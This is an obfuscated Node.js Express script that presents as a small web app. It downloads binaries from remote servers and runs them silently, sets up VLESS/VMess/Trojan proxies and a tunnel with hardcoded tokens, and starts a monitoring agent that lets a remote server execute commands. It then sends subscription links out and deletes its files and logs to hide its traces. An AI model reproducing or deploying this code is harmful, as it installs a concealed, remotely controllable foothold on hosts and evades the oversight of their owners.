const _0x422e88=_0x5660;(function(_0x2d70f,_0x2b1271){const _0x29e708=_0x5660,_0x4aae27=_0x2d70f();while(!![]){try{const _0x339265=-parseInt(_0x29e708(0x11f))/0x1*(parseInt(_0x29e708(0x124))/0x2)+-parseInt(_0x29e708(0x150))/0x3+-parseInt(_0x29e708(0xec))/0x4+parseInt(_0x29e708(0x164))/0x5*(parseInt(_0x29e708(0x130))/0x6)+parseInt(_0x29e708(0xfc))/0x7+parseInt(_0x29e708(0x152))/0x8+parseInt(_0x29e708(0x128))/0x9;if(_0x339265===_0x2b1271)break;else _0x4aae27['push'](_0x4aae27['shift']());}catch(_0x33adb0){_0x4aae27['push'](_0x4aae27['shift']());}}}(_0x84ca,0xa89ba));const express=require(_0x422e88(0x13e)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x422e88(0x17f)),{promisify}=require('util'),exec=promisify(require(_0x422e88(0x145))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x422e88(0x171)][_0x422e88(0x129)]||'',PROJECT_URL=process[_0x422e88(0x171)][_0x422e88(0x177)]||'',AUTO_ACCESS=process['env'][_0x422e88(0x12e)]||![],FILE_PATH=process['env'][_0x422e88(0x14d)]||_0x422e88(0x157),SUB_PATH=process[_0x422e88(0x171)][_0x422e88(0x147)]||_0x422e88(0xfd),PORT=process[_0x422e88(0x171)][_0x422e88(0xfb)]||process[_0x422e88(0x171)]['PORT']||0xbb8,KAMAN=process[_0x422e88(0x171)]['KAMAN']||'a064cb02-e58a-4b98-ae90-3f9909b5f6ec',YOUNGHERO_SERVER=process[_0x422e88(0x171)]['YOUNGHERO_SERVER']||'nzag.faiz.us.kg:8008',YOUNGHERO_PORT=process['env'][_0x422e88(0x151)]||'',YOUNGHERO_KEY=process['env'][_0x422e88(0xe6)]||'JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl',SUIDAO_DOMAIN=process[_0x422e88(0x171)][_0x422e88(0x111)]||'galaxyus.kaixa.xx.kg',SUIDAO_AUTH=process[_0x422e88(0x171)]['SUIDAO_AUTH']||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiY2ZiMjc5NGItMDU0Ny00ODdkLTk3NjQtN2EyMDQyYmM3ZTM2IiwicyI6Ik5XSmhZMk5rWXpNdE1URmhaQzAwTm1RM0xUZzVPVEl0TVRJMFpXWXlPR0U1TlRFNSJ9',SUIDAO_PORT=process['env'][_0x422e88(0xe9)]||0x1f41,CFIP=process[_0x422e88(0x171)][_0x422e88(0xf3)]||_0x422e88(0x156),CFPORT=process[_0x422e88(0x171)]['CFPORT']||0x1bb,NAME=process[_0x422e88(0x171)][_0x422e88(0x13b)]||_0x422e88(0xff);!fs[_0x422e88(0x178)](FILE_PATH)?(fs[_0x422e88(0x149)](FILE_PATH),console[_0x422e88(0x16b)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x179)),phpPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x14f)),webPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x103)),botPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x10d)),subPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x108)),listPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x168)),bootLogPath=path[_0x422e88(0xf9)](FILE_PATH,_0x422e88(0x12d)),configPath=path['join'](FILE_PATH,_0x422e88(0x16a));function deleteNodes(){const _0x5e0d79=_0x422e88;try{if(!UPLOAD_URL)return;if(!fs[_0x5e0d79(0x178)](subPath))return;let _0x248cec;try{_0x248cec=fs[_0x5e0d79(0x131)](subPath,'utf-8');}catch{return null;}const _0x13e496=Buffer[_0x5e0d79(0x132)](_0x248cec,_0x5e0d79(0xf1))[_0x5e0d79(0x123)](_0x5e0d79(0x11c)),_0x4a37a4=_0x13e496[_0x5e0d79(0x187)]('\x0a')[_0x5e0d79(0x163)](_0x284d94=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e0d79(0x10c)](_0x284d94));if(_0x4a37a4[_0x5e0d79(0x139)]===0x0)return;return axios[_0x5e0d79(0x10f)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x4a37a4}),{'headers':{'Content-Type':_0x5e0d79(0x180)}})['catch'](_0x2c82b5=>{return null;});}catch(_0x4a30b3){return null;}}function cleanupOldFiles(){const _0x5f1bde=_0x422e88,_0x1e0b79=[_0x5f1bde(0x103),_0x5f1bde(0x10d),_0x5f1bde(0x179),_0x5f1bde(0x14f),_0x5f1bde(0x108),'boot.log'];_0x1e0b79[_0x5f1bde(0x162)](_0xe2ea77=>{const _0x352aa6=path['join'](FILE_PATH,_0xe2ea77);fs['unlink'](_0x352aa6,()=>{});});}app['get']('/',function(_0x3a3a69,_0xe61453){const _0x8d6184=_0x422e88;_0xe61453['sendFile'](path[_0x8d6184(0xf9)](__dirname,_0x8d6184(0x176)));});const config={'log':{'access':'/dev/null','error':_0x422e88(0x172),'loglevel':'none'},'inbounds':[{'port':SUIDAO_PORT,'protocol':'vless','settings':{'clients':[{'id':KAMAN,'flow':'xtls-rprx-vision'}],'decryption':_0x422e88(0x102),'fallbacks':[{'dest':0xbb9},{'path':'/vless-suidao','dest':0xbba},{'path':_0x422e88(0x167),'dest':0xbbb},{'path':'/trojan-suidao','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x422e88(0x133),'protocol':_0x422e88(0x13a),'settings':{'clients':[{'id':KAMAN}],'decryption':_0x422e88(0x102)},'streamSettings':{'network':_0x422e88(0xea),'security':_0x422e88(0x102)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x422e88(0x13a),'settings':{'clients':[{'id':KAMAN,'level':0x0}],'decryption':_0x422e88(0x102)},'streamSettings':{'network':'ws','security':_0x422e88(0x102),'wsSettings':{'path':_0x422e88(0x135)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x422e88(0x109),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x422e88(0x133),'protocol':_0x422e88(0x174),'settings':{'clients':[{'id':KAMAN,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x422e88(0x167)}},'sniffing':{'enabled':!![],'destOverride':[_0x422e88(0xf2),_0x422e88(0x109),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x422e88(0x133),'protocol':_0x422e88(0xee),'settings':{'clients':[{'password':KAMAN}]},'streamSettings':{'network':'ws','security':_0x422e88(0x102),'wsSettings':{'path':_0x422e88(0x173)}},'sniffing':{'enabled':!![],'destOverride':[_0x422e88(0xf2),_0x422e88(0x109),_0x422e88(0x138)],'metadataOnly':![]}}],'dns':{'servers':[_0x422e88(0x17b)]},'outbounds':[{'protocol':_0x422e88(0x10b),'tag':_0x422e88(0x11d)},{'protocol':'blackhole','tag':_0x422e88(0x106)}]};fs[_0x422e88(0x113)](path['join'](FILE_PATH,'config.json'),JSON[_0x422e88(0x140)](config,null,0x2));function getSystemArchitecture(){const _0x102cc4=_0x422e88,_0x580694=os['arch']();return _0x580694===_0x102cc4(0x119)||_0x580694===_0x102cc4(0xeb)||_0x580694===_0x102cc4(0x14a)?_0x102cc4(0x119):_0x102cc4(0x17e);}function downloadFile(_0x1cf54a,_0x4680de,_0x59dc8b){const _0x561cf0=_0x422e88,_0x1c3df3=path['join'](FILE_PATH,_0x1cf54a),_0x698ee7=fs['createWriteStream'](_0x1c3df3);axios({'method':_0x561cf0(0x12c),'url':_0x4680de,'responseType':_0x561cf0(0x16e)})['then'](_0x1c7dd5=>{const _0x174cd9=_0x561cf0;_0x1c7dd5[_0x174cd9(0x18c)][_0x174cd9(0x183)](_0x698ee7),_0x698ee7['on'](_0x174cd9(0x15a),()=>{const _0x397443=_0x174cd9;_0x698ee7['close'](),console[_0x397443(0x16b)](_0x397443(0x14c)+_0x1cf54a+_0x397443(0x100)),_0x59dc8b(null,_0x1cf54a);}),_0x698ee7['on'](_0x174cd9(0x184),_0x5aa706=>{const _0x5e06b4=_0x174cd9;fs['unlink'](_0x1c3df3,()=>{});const _0x4fa992=_0x5e06b4(0x14c)+_0x1cf54a+_0x5e06b4(0xe8)+_0x5aa706['message'];console['error'](_0x4fa992),_0x59dc8b(_0x4fa992);});})[_0x561cf0(0x137)](_0x2458e4=>{const _0x3f861f=_0x561cf0,_0x2e0238=_0x3f861f(0x14c)+_0x1cf54a+_0x3f861f(0xe8)+_0x2458e4[_0x3f861f(0x166)];console[_0x3f861f(0x184)](_0x2e0238),_0x59dc8b(_0x2e0238);});}function _0x84ca(){const _0x41dcaf=['\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x20\x20\x20\x20','automatic\x20access\x20task\x20added\x20successfully','forEach','filter','10dlIOxP','2096','message','/vmess-suidao','list.txt','includes','config.json','log','?security=tls&sni=','bot\x20is\x20running.','stream','\x0aclient_secret:\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','env','/dev/null','/trojan-suidao','vmess','/config.json\x20>/dev/null\x202>&1\x20&','app.html','PROJECT_URL','existsSync','npm','all','https+local://8.8.8.8/dns-query','SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain','Error\x20executing\x20command:\x20','amd','path','application/json','Subscription\x20uploaded\x20successfully','unlinkSync','pipe','error','npm\x20running\x20error:\x20','false','split','SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','443','\x0a\x20\x20\x0atrojan://','./web','data','push','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','YOUNGHERO_KEY','8443','\x20failed:\x20','SUIDAO_PORT','tcp','arm64','4146976szuRXj','npm\x20is\x20running','trojan','./bot','/api/add-subscriptions','base64','http','CFIP','true','tunnel.yml','status','unshift','nohup\x20','join','config.yaml','SERVER_PORT','4188653HsxBdf','sub','App\x20is\x20running','Vls','\x20successfully','SuidaoDomain:','none','web','./php','https://arm64.ssss.nyc.mn/2go','block','Empowerment\x20success\x20for\x20','sub.txt','tls','&path=%2Ftrojan-suidao%3Fed%3D2560#','freedom','test','bot','&path=%2Fvless-suidao%3Fed%3D2560#','post','https://amd64.ssss.nyc.mn/web','SUIDAO_DOMAIN','\x0avless://','writeFileSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/npm\x20-s\x20','match','2083','rm\x20-rf\x20','arm','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','utf-8','direct','Empowerment\x20failed\x20for\x20','1vDVnkR','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/agent','toString','2609162AeXbVz','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','11151378enJoxI','UPLOAD_URL','/tunnel.yml\x20run','\x20-p\x20','get','boot.log','AUTO_ACCESS','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','1308414BCMCxA','readFileSync','from','127.0.0.1','2087','/vless-suidao','tunnel.json','catch','quic','length','vless','NAME','Content-Type','\x0a\x20\x20tunnel:\x20','express','set','stringify','https://amd64.ssss.nyc.mn/v1','send','has','\x20>/dev/null\x202>&1\x20&','child_process','./npm','SUB_PATH','response','mkdirSync','aarch64','clear','Download\x20','FILE_PATH','\x20>/dev/null\x202>&1','php','540345QswaNw','YOUNGHERO_PORT','7507992wpuurh','https://oooo.serv00.net/add-url','2053','/vmess-suidao?ed=2560','rpip.kaixa.v6.navy','./tmp','https://amd64.ssss.nyc.mn/agent','pop','finish','/sub.txt\x20saved\x20successfully','trim','--tls'];_0x84ca=function(){return _0x41dcaf;};return _0x84ca();}async function downloadFilesAndRun(){const _0x454fe0=_0x422e88,_0x2ddf47=getSystemArchitecture(),_0xee3df3=getFilesForArchitecture(_0x2ddf47);if(_0xee3df3[_0x454fe0(0x139)]===0x0){console[_0x454fe0(0x16b)](_0x454fe0(0xe5));return;}const _0x16c719=_0xee3df3['map'](_0x4ed0cf=>{return new Promise((_0x235646,_0x5d25d6)=>{downloadFile(_0x4ed0cf['fileName'],_0x4ed0cf['fileUrl'],(_0x12a451,_0x404dd4)=>{_0x12a451?_0x5d25d6(_0x12a451):_0x235646(_0x404dd4);});});});try{await Promise[_0x454fe0(0x17a)](_0x16c719);}catch(_0x40bcf4){console[_0x454fe0(0x184)]('Error\x20downloading\x20files:',_0x40bcf4);return;}function _0x50be6b(_0x1ee6bc){const _0x4c3850=0x1fd;_0x1ee6bc['forEach'](_0x17effa=>{const _0x2b0eb3=_0x5660,_0x29ad4f=path[_0x2b0eb3(0xf9)](FILE_PATH,_0x17effa);fs[_0x2b0eb3(0x178)](_0x29ad4f)&&fs['chmod'](_0x29ad4f,_0x4c3850,_0x3a8f8a=>{const _0x49cbdd=_0x2b0eb3;_0x3a8f8a?console['error'](_0x49cbdd(0x11e)+_0x29ad4f+':\x20'+_0x3a8f8a):console['log'](_0x49cbdd(0x107)+_0x29ad4f+':\x20'+_0x4c3850[_0x49cbdd(0x123)](0x8));});});}const _0x1aabd5=YOUNGHERO_PORT?[_0x454fe0(0x146),_0x454fe0(0x18b),_0x454fe0(0xef)]:[_0x454fe0(0x104),_0x454fe0(0x18b),'./bot'];_0x50be6b(_0x1aabd5);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x9487c5=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER[_0x454fe0(0x187)](':')[_0x454fe0(0x159)]():'',_0x20783a=new Set(['443',_0x454fe0(0xe7),_0x454fe0(0x165),_0x454fe0(0x134),_0x454fe0(0x117),_0x454fe0(0x154)]),_0x48f7e5=_0x20783a[_0x454fe0(0x143)](_0x9487c5)?_0x454fe0(0xf4):_0x454fe0(0x186),_0x199a3e=_0x454fe0(0x16f)+YOUNGHERO_KEY+_0x454fe0(0x15f)+YOUNGHERO_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x48f7e5+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+KAMAN;fs[_0x454fe0(0x113)](path[_0x454fe0(0xf9)](FILE_PATH,_0x454fe0(0xfa)),_0x199a3e);const _0x3d9e89='nohup\x20'+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x454fe0(0x127);try{await exec(_0x3d9e89),console[_0x454fe0(0x16b)]('php\x20is\x20running'),await new Promise(_0x436051=>setTimeout(_0x436051,0x3e8));}catch(_0x17b66b){console[_0x454fe0(0x184)]('php\x20running\x20error:\x20'+_0x17b66b);}}else{let _0x495fc6='';const _0x435ced=[_0x454fe0(0x189),_0x454fe0(0xe7),_0x454fe0(0x165),'2087',_0x454fe0(0x117),_0x454fe0(0x154)];_0x435ced[_0x454fe0(0x169)](YOUNGHERO_PORT)&&(_0x495fc6=_0x454fe0(0x15d));const _0x58e0d6=_0x454fe0(0xf8)+FILE_PATH+_0x454fe0(0x115)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x454fe0(0x12b)+YOUNGHERO_KEY+'\x20'+_0x495fc6+_0x454fe0(0x144);try{await exec(_0x58e0d6),console[_0x454fe0(0x16b)](_0x454fe0(0xed)),await new Promise(_0x518c96=>setTimeout(_0x518c96,0x3e8));}catch(_0x3a2063){console['error'](_0x454fe0(0x185)+_0x3a2063);}}}else console[_0x454fe0(0x16b)]('YOUNGHERO\x20variable\x20is\x20empty,skip\x20running');const _0x48986c=_0x454fe0(0xf8)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x454fe0(0x175);try{await exec(_0x48986c),console['log']('web\x20is\x20running'),await new Promise(_0x4a0035=>setTimeout(_0x4a0035,0x3e8));}catch(_0x17ddc9){console[_0x454fe0(0x184)]('web\x20running\x20error:\x20'+_0x17ddc9);}if(fs['existsSync'](path['join'](FILE_PATH,_0x454fe0(0x10d)))){let _0x156959;if(SUIDAO_AUTH[_0x454fe0(0x116)](/^[A-Z0-9a-z=]{120,250}$/))_0x156959=_0x454fe0(0x121)+SUIDAO_AUTH;else SUIDAO_AUTH['match'](/TunnelSecret/)?_0x156959=_0x454fe0(0x120)+FILE_PATH+_0x454fe0(0x12a):_0x156959='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x454fe0(0x114)+SUIDAO_PORT;try{await exec(_0x454fe0(0xf8)+FILE_PATH+'/bot\x20'+_0x156959+_0x454fe0(0x144)),console['log']('bot\x20is\x20running'),await new Promise(_0x4d5169=>setTimeout(_0x4d5169,0x7d0));}catch(_0xa10e48){console[_0x454fe0(0x184)]('Error\x20executing\x20command:\x20'+_0xa10e48);}}await new Promise(_0x3de2d1=>setTimeout(_0x3de2d1,0x1388));}function getFilesForArchitecture(_0x37e670){const _0xf2b22d=_0x422e88;let _0x48ec3b;_0x37e670==='arm'?_0x48ec3b=[{'fileName':_0xf2b22d(0x103),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0xf2b22d(0x10d),'fileUrl':_0xf2b22d(0x105)}]:_0x48ec3b=[{'fileName':_0xf2b22d(0x103),'fileUrl':_0xf2b22d(0x110)},{'fileName':_0xf2b22d(0x10d),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x3cb58b=_0x37e670===_0xf2b22d(0x119)?_0xf2b22d(0x122):_0xf2b22d(0x158);_0x48ec3b[_0xf2b22d(0xf7)]({'fileName':_0xf2b22d(0x179),'fileUrl':_0x3cb58b});}else{const _0x1e8546=_0x37e670===_0xf2b22d(0x119)?'https://arm64.ssss.nyc.mn/v1':_0xf2b22d(0x141);_0x48ec3b['unshift']({'fileName':_0xf2b22d(0x14f),'fileUrl':_0x1e8546});}}return _0x48ec3b;}function suidaoType(){const _0x4eda1a=_0x422e88;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console['log'](_0x4eda1a(0x188));return;}if(SUIDAO_AUTH[_0x4eda1a(0x169)]('TunnelSecret')){fs[_0x4eda1a(0x113)](path[_0x4eda1a(0xf9)](FILE_PATH,_0x4eda1a(0x136)),SUIDAO_AUTH);const _0x697a1c=_0x4eda1a(0x13d)+SUIDAO_AUTH[_0x4eda1a(0x187)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4eda1a(0xf9)](FILE_PATH,_0x4eda1a(0x136))+_0x4eda1a(0x126)+SUIDAO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+SUIDAO_PORT+_0x4eda1a(0x15e);fs[_0x4eda1a(0x113)](path[_0x4eda1a(0xf9)](FILE_PATH,_0x4eda1a(0xf5)),_0x697a1c);}else console[_0x4eda1a(0x16b)](_0x4eda1a(0x125));}suidaoType();async function extractDomains(){const _0x2990f5=_0x422e88;let _0x15b10c;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x15b10c=SUIDAO_DOMAIN,console[_0x2990f5(0x16b)]('SUIDAO_DOMAIN:',_0x15b10c),await _0x309ebb(_0x15b10c);else try{const _0x2abdbd=fs[_0x2990f5(0x131)](path[_0x2990f5(0xf9)](FILE_PATH,_0x2990f5(0x12d)),'utf-8'),_0x460605=_0x2abdbd[_0x2990f5(0x187)]('\x0a'),_0x5b3fd6=[];_0x460605[_0x2990f5(0x162)](_0xcbabf9=>{const _0xcaa42c=_0x2990f5,_0x48ca58=_0xcbabf9[_0xcaa42c(0x116)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x48ca58){const _0xb12fc3=_0x48ca58[0x1];_0x5b3fd6[_0xcaa42c(0x18d)](_0xb12fc3);}});if(_0x5b3fd6[_0x2990f5(0x139)]>0x0)_0x15b10c=_0x5b3fd6[0x0],console[_0x2990f5(0x16b)](_0x2990f5(0x101),_0x15b10c),await _0x309ebb(_0x15b10c);else{console[_0x2990f5(0x16b)](_0x2990f5(0x17c)),fs[_0x2990f5(0x182)](path[_0x2990f5(0xf9)](FILE_PATH,_0x2990f5(0x12d)));async function _0x26b1c2(){const _0x596af7=_0x2990f5;try{await exec(_0x596af7(0x170));}catch(_0x56862c){}}_0x26b1c2(),await new Promise(_0xe830aa=>setTimeout(_0xe830aa,0xbb8));const _0x1d1018=_0x2990f5(0x11b)+FILE_PATH+_0x2990f5(0x114)+SUIDAO_PORT;try{await exec(_0x2990f5(0xf8)+path[_0x2990f5(0xf9)](FILE_PATH,_0x2990f5(0x10d))+'\x20'+_0x1d1018+_0x2990f5(0x144)),console[_0x2990f5(0x16b)](_0x2990f5(0x16d)),await new Promise(_0x4dff04=>setTimeout(_0x4dff04,0xbb8)),await extractDomains();}catch(_0x3027c5){console[_0x2990f5(0x184)](_0x2990f5(0x17d)+_0x3027c5);}}}catch(_0x5d222a){console[_0x2990f5(0x184)]('Error\x20reading\x20boot.log:',_0x5d222a);}async function _0x309ebb(_0x8e52ec){const _0x596919=_0x2990f5,_0x1dbdab=execSync(_0x596919(0x12f),{'encoding':_0x596919(0x11c)}),_0x2a8e1a=_0x1dbdab[_0x596919(0x15c)]();return new Promise(_0x485f81=>{setTimeout(()=>{const _0x1c3272=_0x5660,_0x5129e7={'v':'2','ps':NAME+'-'+_0x2a8e1a,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':_0x1c3272(0x102),'net':'ws','type':'none','host':_0x8e52ec,'path':_0x1c3272(0x155),'tls':_0x1c3272(0x109),'sni':_0x8e52ec,'alpn':''},_0x15af42=_0x1c3272(0x112)+KAMAN+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x8e52ec+'&type=ws&host='+_0x8e52ec+_0x1c3272(0x10e)+NAME+'-'+_0x2a8e1a+'\x0a\x20\x20\x0avmess://'+Buffer[_0x1c3272(0x132)](JSON['stringify'](_0x5129e7))[_0x1c3272(0x123)]('base64')+_0x1c3272(0x18a)+KAMAN+'@'+CFIP+':'+CFPORT+_0x1c3272(0x16c)+_0x8e52ec+'&type=ws&host='+_0x8e52ec+_0x1c3272(0x10a)+NAME+'-'+_0x2a8e1a+_0x1c3272(0x160);console[_0x1c3272(0x16b)](Buffer[_0x1c3272(0x132)](_0x15af42)[_0x1c3272(0x123)](_0x1c3272(0xf1))),fs['writeFileSync'](subPath,Buffer[_0x1c3272(0x132)](_0x15af42)[_0x1c3272(0x123)](_0x1c3272(0xf1))),console[_0x1c3272(0x16b)](FILE_PATH+_0x1c3272(0x15b)),uplodNodes(),app[_0x1c3272(0x12c)]('/'+SUB_PATH,(_0x13f46d,_0x53f7bc)=>{const _0xd8e427=_0x1c3272,_0x272fad=Buffer[_0xd8e427(0x132)](_0x15af42)[_0xd8e427(0x123)](_0xd8e427(0xf1));_0x53f7bc[_0xd8e427(0x13f)](_0xd8e427(0x13c),'text/plain;\x20charset=utf-8'),_0x53f7bc[_0xd8e427(0x142)](_0x272fad);}),_0x485f81(_0x15af42);},0x7d0);});}}async function uplodNodes(){const _0x2d4df1=_0x422e88;if(UPLOAD_URL&&PROJECT_URL){const _0x2e4610=PROJECT_URL+'/'+SUB_PATH,_0x52f07b={'subscription':[_0x2e4610]};try{const _0x5d4311=await axios['post'](UPLOAD_URL+_0x2d4df1(0xf0),_0x52f07b,{'headers':{'Content-Type':'application/json'}});if(_0x5d4311[_0x2d4df1(0xf6)]===0xc8)console[_0x2d4df1(0x16b)](_0x2d4df1(0x181));else return null;}catch(_0x89f21c){if(_0x89f21c[_0x2d4df1(0x148)]){if(_0x89f21c[_0x2d4df1(0x148)][_0x2d4df1(0xf6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2d4df1(0x178)](listPath))return;const _0x4b572=fs[_0x2d4df1(0x131)](listPath,_0x2d4df1(0x11c)),_0x56e472=_0x4b572['split']('\x0a')[_0x2d4df1(0x163)](_0x6b2b04=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d4df1(0x10c)](_0x6b2b04));if(_0x56e472['length']===0x0)return;const _0x1fda7c=JSON[_0x2d4df1(0x140)]({'nodes':_0x56e472});try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x1fda7c,{'headers':{'Content-Type':_0x2d4df1(0x180)}});if(response[_0x2d4df1(0xf6)]===0xc8)console['log'](_0x2d4df1(0x181));else return null;}catch(_0x7fa431){return null;}}else return;}}function _0x5660(_0x4fede5,_0x3ce03e){const _0x84cacd=_0x84ca();return _0x5660=function(_0x566008,_0x3de0ca){_0x566008=_0x566008-0xe5;let _0x213e97=_0x84cacd[_0x566008];return _0x213e97;},_0x5660(_0x4fede5,_0x3ce03e);}function cleanFiles(){setTimeout(()=>{const _0x3633bb=_0x5660,_0x3b5fe5=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x3b5fe5['push'](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x3b5fe5[_0x3633bb(0x18d)](phpPath);exec(_0x3633bb(0x118)+_0x3b5fe5[_0x3633bb(0xf9)]('\x20')+_0x3633bb(0x14e),_0x1f0014=>{const _0x3d6365=_0x3633bb;console[_0x3d6365(0x14b)](),console[_0x3d6365(0x16b)](_0x3d6365(0xfe)),console[_0x3d6365(0x16b)](_0x3d6365(0x11a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x174f16=_0x422e88;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x174f16(0x16b)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5a8cbd=await axios[_0x174f16(0x10f)](_0x174f16(0x153),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x174f16(0x180)}});console[_0x174f16(0x16b)](_0x174f16(0x161));}catch(_0x4b834b){console[_0x174f16(0x184)]('添加URL失败:\x20'+_0x4b834b[_0x174f16(0x166)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
